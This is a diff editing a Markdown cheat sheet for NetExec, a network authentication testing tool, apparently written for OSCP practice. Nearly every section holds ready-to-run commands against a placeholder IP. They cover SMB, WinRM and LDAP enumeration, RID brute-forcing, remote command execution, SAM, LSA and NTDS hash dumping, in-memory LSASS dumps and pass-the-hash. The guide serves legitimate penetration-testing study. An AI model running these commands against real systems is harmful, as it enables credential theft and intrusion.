@@ -1,169 +1,173 @@
----
 # NetExec - Swiss Army Knife for Network Authentication Testing
 
 NetExec (`nxc`) is the maintained fork of CrackMapExec. Most people associate it with Active Directory, but it is equally useful on non-AD assessments - any time you hit SMB or WinRM, NetExec belongs in your workflow.
 
----
-
 ## Why NetExec
 
 The core value is speed and consistency. Instead of juggling multiple tools for credential validation, share enumeration, and post-exploitation, NetExec handles all of it through a single interface across SMB, WinRM, LDAP, RDP, and SSH. On OSCP, time and mental overhead are your real constraints - having one tool that does everything means fewer context switches and fewer mistakes.
 
----
-
 ## SMB
 
 ### Credential Validation
----
 
-## Why NetExec
-
-The core value is speed and consistency. Instead of juggling multiple tools for credential validation, share enumeration, and post-exploitation, NetExec handles all of it through a single interface across SMB, WinRM, LDAP, RDP, and SSH. On OSCP, time and mental overhead are your real constraints - having one tool that does everything means fewer context switches and fewer mistakes.
-
----
-
-## SMB
-
-### Credential Validation
+Check if credentials are valid and whether the account has local admin rights:
 
 ```bash
 nxc smb 10.10.10.10 -u user -p password
+```
 
-The output tells you immediately what you have. [+] means valid credentials. (Pwned!) next to the result means the account has local admin rights on that machine - you can dump hashes without any further escalation.
+`[+]` means valid credentials. `(Pwned!)` means local admin rights on that machine.
 
----
-Share Enumeration
+### Share Enumeration
 
-Anonymous and guest access is worth testing on every assessment - including non-AD ones:
+Test anonymous access:
 
+```bash
 nxc smb 10.10.10.10 -u '' -p ''
+```
 
+Test guest access:
+
+```bash
 nxc smb 10.10.10.10 -u guest -p ''
+```
 
-With valid credentials:
+List shares with valid credentials:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password --shares
+```
 
----
-User Enumeration
+### User Enumeration
 
-When guest auth is enabled, check the description field - developers and sysadmins occasionally store forgotten credentials there:
+Enumerate users anonymously - also check the `description` field, it sometimes contains forgotten passwords:
 
+```bash
 nxc smb 10.10.10.10 -u '' -p '' --users
+```
 
-With valid credentials:
+Enumerate users with valid credentials:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password --users
+```
 
---rid-brute does not require credentials if guest auth is enabnd resolves them to account names - useful for building a
-username list before you have any valid credentials:
+RID brute-force to resolve account names - works without credentials if guest auth is enabled:
 
+```bash
 nxc smb 10.10.10.10 -u '' -p '' --rid-brute
+```
 
----
-Remote Command Execution
+### Remote Command Execution
 
-Requires local admin. Use -x for cmd.exe and -X for PowerShell:
+Requires local admin. Use `-x` for cmd.exe, `-X` for PowerShell:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password -x whoami
+```
 
+```bash
 nxc smb 10.10.10.10 -u user -p password -X whoami
+```
 
----
-Credential and Hash Dumping
+### Credential and Hash Dumping
 
-Once you have local admin rights, NetExec handles remote dumps without touching disk on the target - no Mimikatz upload required.
+Once you have local admin rights, NetExec handles remote dumps without touching disk - no Mimikatz upload required.
 
-SAM database - local account hashes:
+Dump SAM - local account hashes:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password --sam
+```
 
-LSA secrets - service account credentials and cached domain creds:
+Dump LSA secrets - service accounts and cached domain credentials:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password --lsa
+```
 
-NTDS.dit - all domain account hashes (requires DC access):
+Dump NTDS.dit - all domain account hashes, DC only:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password --ntds
+```
 
-In-memory credential dumping via lsassy - no binary upload to disk:
+In-memory dump via lsassy - no binary touches disk:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password -M lsassy
+```
 
-Alternative in-memory dump - useful when lsassy is blocked:
+Alternative in-memory dump when lsassy is blocked:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password -M nanodump
+```
 
-See who is currently logged in:
+Check who is currently logged in:
 
+```bash
 nxc smb 10.10.10.10 -u user -p password --loggedon-users
+```
 
---sam and --lsa are the fastest options. lsassy is more powerful but noisier. On OSCP, --sam first - it is fast and gets you local hashes immediately for pass-the-hash or cracking.
+`--sam` and `--lsa` are fastest. On OSCP use `--sam` first - immediate local hashes for pass-the-hash or cracking.
 
----
-Pass the Hash
+### Pass the Hash
 
-All SMB commands accept NT hashes instead of a password:
+All commands accept an NT hash instead of a password:
 
+```bash
 nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+```
 
----
-WinRM
+## WinRM
 
-Check if the account can authenticate to WinRM:
+Check if credentials work over WinRM:
 
+```bash
 nxc winrm 10.10.10.10 -u user -p password
+```
 
-(Pwned!) means the account has WinRM access and you can get a shell via Evil-WinRM. Execute commands directly:
+`(Pwned!)` means WinRM access confirmed - use Evil-WinRM to get a shell. Execute a command directly:
 
+```bash
 nxc winrm 10.10.10.10 -u user -p password -x whoami
+```
 
----
-LDAP
+## LDAP
 
-Anonymous bind - leaks users, groups, and sometimes password policy without any credentials:
+Anonymous bind - leaks users, groups, and password policy without credentials:
 
+```bash
 nxc ldap 10.10.10.10 -u '' -p ''
+```
 
-User enumeration with valid credentials:
+Enumerate users with valid credentials:
 
+```bash
 nxc ldap 10.10.10.10 -u user -p password --users
+```
 
-BloodHound data collection - replaces SharpHound when you want to avoid uploading a binary to the target:
+Collect BloodHound data without uploading SharpHound to the target:
 
+```bash
 nxc ldap 10.10.10.10 -u user -p password --bloodhound --collection All
+```
 
----
-Quick Reference
+## Quick Reference
 
-┌──────────┬───────────────────┬───────────────────────────────────────────────────────────┐
-│ Protocol │     Use Case      │                          Command                          │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ Check local admin │ nxc smb IP -u user -p pass                                │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ Anonymous access  │ nxc smb IP -u '' -p ''                                    │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ List shares       │ nxc smb IP -u user -p pass --shares                       │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ Enumerate users   │ nxc smb IP -u user -p pass --users                        │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ RID brute         │ nxc smb IP -u '' -p '' --rid-brute                        │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ Dump SAM          │ nxc smb IP -u user -p pass --sam                          │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ Dump LSA          │ nxc smb IP -u user -p pass --│
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ In-memory dump    │ nxc smb IP -u user -p pass -M lsassy                      │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ All domain hashes │ nxc smb IP -u user -p pass --ntds                         │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ SMB      │ Execute command   │ nxc smb IP -u user -p pass -x cmd                         │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ WinRM    │ Check access      │ nxc winrm IP -u user -p pass                              │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ LDAP     │ Anonymous bind    │ nxc ldap IP -u '' -p ''                                   │
-├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
-│ LDAP     │ BloodHound        │ nxc ldap IP -u user -p pass --bloodhound --collection All │
-└──────────┴───────────────────┴──────────────────────────────┘
-
----
+| Protocol | Use Case | Command |
+|----------|----------|---------|
+| SMB | Check local admin | <code>nxc smb IP -u user -p pass</code> |
+| SMB | Anonymous access | <code>nxc smb IP -u '' -p ''</code> |
+| SMB | List shares | <code>nxc smb IP -u user -p pass --shares</code> |
+| SMB | Enumerate users | <code>nxc smb IP -u user -p pass --users</code> |
+| SMB | RID brute | <code>nxc smb IP -u '' -p '' --rid-brute</code> |
+| SMB | Dump SAM | <code>nxc smb IP -u user -p pass --sam</code> |
+| SMB | Dump LSA | <code>nxc smb IP -u user -p pass --lsa</code> |
+| SMB | In-memory dump | <code>nxc smb IP -u user -p pass -M lsassy</code> |
+| SMB | All domain hashes | <code>nxc smb IP -u user -p pass --ntds</code> |
+| SMB | Execute command | <code>nxc smb IP -u user -p pass -x cmd</code> |
+| WinRM | Check access | <code>nxc winrm IP -u user -p pass</code> |
+| LDAP | Anonymous bind | <code>nxc ldap IP -u '' -p ''</code> |
+| LDAP | BloodHound | <code>nxc ldap IP -u user -p pass --bloodhound --collection All</code> |
